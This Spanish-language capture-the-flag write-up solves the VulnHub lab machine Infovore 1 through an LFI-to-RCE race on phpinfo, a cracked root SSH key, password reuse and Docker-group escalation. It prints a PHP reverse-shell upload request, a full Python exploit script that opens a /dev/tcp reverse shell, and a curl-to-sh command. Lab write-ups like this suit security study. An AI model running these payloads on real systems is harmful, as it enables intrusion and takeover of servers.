
---
- Tags: #Infovore #vulnhub
---

- **Máquina Infovore 1**: [https://www.vulnhub.com/entry/infovore-1,496/](https://www.vulnhub.com/entry/infovore-1,496/)

### Reconocimiento
Como siempre empezamos la fase de reconocimiento con un *arp-scan* en el local host para detectar la ip de la máquina víctima. 
```bash
arp-scan -I ens33 --localnet
```
Una vez descubierta la ip (192.168.18.240) procedemos con el escaneo de puertos en Nmap.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.240 -oG allPorts 

nmap -sC -sV -p80 192.168.18.240 -oN Targgeted

nmap --script http-enum -p80 192.168.18.240 -oN webScan
```
Encontramos un directorio */include me* y un */info.php*. El segundo nos proporciona bastantes informaciones valiosas sobre versión de php y futuros vectores de ataque pero por el momento aún no podemos hacer gran cosa. El *file_uploads* esta en on lo que significa que podemos hacer un *LFI to RCE* abusando de este recurso, enviando una solicitud por *POST*.
https://hacktricks.wiki/es/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html

Abrimos el burpsuite e interceptamos el info.php, cambiamos el método de GET a POST y añadimos unas lineas de texto plano.
```burpsuite
POST /info.php HTTP/1.1

Host: 192.168.18.240

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7

Accept-Encoding: gzip, deflate, br

Sec-GPC: 1

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Priority: u=0, i

Content-Type: multipart/form-data; boundary=--pwned

Content-Length: 194



----pwned

Content-Disposition: form-data; name="name"; filename="cmd.php"

Content-Type: text/plain


<?php system("bash -c 'bash -1 >& /dev/tcp/192.168.18.226/443 0>&1'*); ?>


----pwned
```
Si enviamos la request, podemos ver que la página intenta crear en un directorio temporal, el cmd.php. Esto significa que si encontramos una forma de apuntar a ese recurso, que ya existe y logramos interpretar el código php, tendriamos una reverse shell y estariamos dentro.
Para encontrar esa forma de apuntar al archivo, vamos a hacer un *wfuzz* a la ruta principal.
```bash
wfuzz -c --hl=136 -t 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://192.168.18.240/index.php?FUZZ=etc/passwd"
```
Y encontramos un parámetro, *filename*. Asi que ahora con burpsuite tenemos una via potencial de crear un archivo y con filename podemos interpretarlo, pero acontece que el archivo que creamos inmediatamente, se borra, con lo cuál lo que vamos a hacer es estar enviando continuamente peticiones en filename para que cuando se cree el archivo, inmediatamente, se interprete. 
Vamos a hacerlo con un script de la página web anteriormente mencionada:
```python
#!/usr/bin/env python3
# Original credits: https://github.com/diegoalbuquerque
# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
# Adaptado a Python3 para compatibilidad y uso actual por Metahumo

from __future__ import print_function
import sys
import threading
import socket

def setup(host, port):
    TAG = "Security Test"
    PAYLOAD = """%s\r
<?php system("bash -c 'bash -i >& /dev/tcp/<IP_Atacante>/443 0>&1'");?>\r""" % TAG
    REQ1_DATA = (
        "-----------------------------7dbff1ded0714\r\n"
        "Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\r\n"
        "Content-Type: text/plain\r\n"
        "\r\n"
        "%s\r\n"
        "-----------------------------7dbff1ded0714--\r\n"
    ) % PAYLOAD

    padding = "A" * 5000

    content_length = len(REQ1_DATA.encode('utf-8'))
    REQ1 = ( # sustituir 'info.php' por la ruta que proceda
        "POST /info.php?a=" + padding + " HTTP/1.1\r\n"
        "Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=" + padding + "\r\n"
        "HTTP_ACCEPT: " + padding + "\r\n"
        "HTTP_USER_AGENT: " + padding + "\r\n"
        "HTTP_ACCEPT_LANGUAGE: " + padding + "\r\n"
        "HTTP_PRAGMA: " + padding + "\r\n"
        "Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\n"
        "Content-Length: %s\r\n"
        "Host: %s\r\n"
        "\r\n"
        "%s"
    ) % (content_length, host, REQ1_DATA)

    LFIREQ = ( # sustituir 'index.php?filename' por la ruta que proceda
        "GET /index.php?filename=%s HTTP/1.1\r\n"
        "User-Agent: Mozilla/4.0\r\n"
        "Proxy-Connection: Keep-Alive\r\n"
        "Host: %s\r\n"
        "\r\n"
    )

    return (REQ1, TAG, LFIREQ)


def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host, port))
        s2.connect((host, port))

        # enviar request phpinfo (bytes)
        s.sendall(phpinforeq.encode('utf-8'))

        # leer suficiente para encontrar tmp_name (rápido)
        d = b""
        while len(d) < max(4096, offset):
            chunk = s.recv(4096)
            if not chunk:
                break
            d += chunk

        # buscar tmp_name en bytes (soporta "&gt;")
        i = d.find(b"[tmp_name] =>")
        if i == -1:
            i = d.find(b"[tmp_name] =&gt;")
        if i == -1:
            return None

        fn = d[i+17:i+31].split()[0].decode('utf-8', errors='ignore')

        # pedir LFI (enviar y leer toda la respuesta)
        s2.sendall((lfireq % (fn, host)).encode('utf-8'))

        d2 = b""
        while True:
            chunk = s2.recv(4096)
            if not chunk:
                break
            d2 += chunk

        if tag.encode('utf-8') in d2:
            return fn

    finally:
        try:
            s.close()
        except Exception:
            pass
        try:
            s2.close()
        except Exception:
            pass

    return None


counter = 0


class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print("\nGot it! Shell created in /tmp/g (filename: %s)" % x)
                    self.event.set()
            except socket.error:
                return


def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the phpinfo output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(phpinforeq.encode('utf-8'))

    d = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        d += chunk
        # detectar final chunked (si aplica)
        if chunk.endswith(b"0\r\n\r\n"):
            break
    s.close()

    i = d.find(b"[tmp_name] =>")
    if i == -1:
        i = d.find(b"[tmp_name] =&gt;")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print("found %s at %i" % (d[i:i+10].decode('utf-8', errors='ignore'), i))
    return i + 256


def main():
    print("LFI With PHPInfo()")
    print("-=" * 30)

    if len(sys.argv) < 2:
        print("Usage: %s host [port] [threads]" % sys.argv[0])
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print("Error with hostname %s: %s" % (sys.argv[1], e))
        sys.exit(1)

    port = 80
    try:
        port = int(sys.argv[2])
    except (IndexError, ValueError):
        port = 80

    poolsz = 10
    try:
        poolsz = int(sys.argv[3])
    except (IndexError, ValueError):
        poolsz = 10

    print("Getting initial offset...", end=' ')
    reqphp, tag, reqlfi = setup(host, port)
    try:
        offset = getOffset(host, port, reqphp)
    except Exception as e:
        print("\nError obteniendo offset:", e)
        sys.exit(1)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print("Spawning worker pool (%d)..." % poolsz)
    sys.stdout.flush()

    tp = []
    for i in range(0, poolsz):
        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write("\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print()
        if e.is_set():
            print("Woot!  \\m/")
        else:
            print(":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()

    print("Shuttin' down...")
    for t in tp:
        t.join()


if __name__ == "__main__":
    print("Don't forget to modify the LFI URL")
    main()
```
Aqui solamente tendremos que añadir la ip del atacante en donde corresponde, ponernos por escucha con nc por el 443 y añadir la ip y puerto de la máquina al ejecutar el script. Ya tendríamos una Shell, procedemos con el tratamiento de la tty:
```shell
script /dev/null -c bash
#ctrl + z
stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```
El usuario es *www-data* y si hacemos un *hostname -I* vemos que la ip es diferente, lo que nos indica que estamos en un contenedor. 

### Escalada de privilegios
Para la escalada necesitaremos escapar del contenedor, después de probar formas típicas de escalado como: capabilites, archivos que contengan config, usuarios con acceso a "sh$", achivos con passwd... Pero nada dio resultado o se encontro nada relevante. 
Vamos a proceder a utilizar la herramienta *linPEAS*, herramienta que se puede usar en el OSCP porque no explota, solo enumera.
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
``` 
y encontramos MUCHAS cosas, pero vamos a centrarnos en un archivo oculto en la raíz llamado *.oldkeys.tgz*. Nos lo transladamos al directorio /tmp/ y le cambiamos el nombre para que no sea un archivo oculto y le hacemos un *tar -xf* para descomprimirlo.
Tenemos dos archivos, uno de ellos (root) es la clave privada y cifrada para root, además de eso podemos ver que el puerto 22 de la máquina víctima esta abieta.
```bash
hostname -I
cat /proc/net/arp
echo '' > /dev/tcp/192.168.150.1/22
```
Por tanto, podríamos intentar usar esta clave privada para conectarnos como root a la máquina principal.

Vamos a utilizar john para crackearlo:
```bash
nvim id_rsa
python2.7 /usr/lib/john/ssh2john.py id_rsa
nvim hash 
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
```
El id_rsa nos da la palabra *choclate93* , con esta contraseña no nos podemos conectar por ssh a la máquina principal pero por lo menos podemos ser root en el contenedor.
![[Pasted image 20260925132650.png]]
Nos dan una primera FLAG, pero la idea es escapar del contenedor.
Para acceder a la máquina principal, si vamos al *~/.ssh* alli encontraremos las claves ssh ademas de un archivo *know_hosts* donde figura el usuario admin, lo que nos da a entender que puede haber una cofiabilidad entre ese usuario y la máquina principal, debido a las claves que están seteadas. 
Nos intentamos conectar como usuario admin a la máquina principal por ssh y tenemos una reutilización de credenciales, *choclate93* en este caso.
![[Pasted image 20260925133555.png]]
Ahora tendriamos que escalar como root en la principal. 
Estamos en el grupo Docker, entonces podemos crear un contenedor donde abusando de monturas, montar toda la raiz del sistema en un contenedor, obteniendo acceso total a todo.
```bash
docker run -dit -v /:/mnt/root --name privesc theart42/infovore
```
![[Pasted image 20260925134459.png]]
Lo que hacemos en la imagen es entrar a la montura de docker del sistema, y darle permisos a la bash. Luego nos salimos y si lanzamos un *bash -p* estaremos como root. Nos metemos al directorio y vemos la última FLAG.
![[Pasted image 20260925135210.png]]